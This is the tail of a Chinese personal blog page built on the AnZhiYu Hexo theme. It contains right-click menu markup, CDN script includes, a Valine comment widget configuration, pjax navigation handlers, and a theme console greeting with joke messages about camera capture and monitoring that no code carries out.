anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>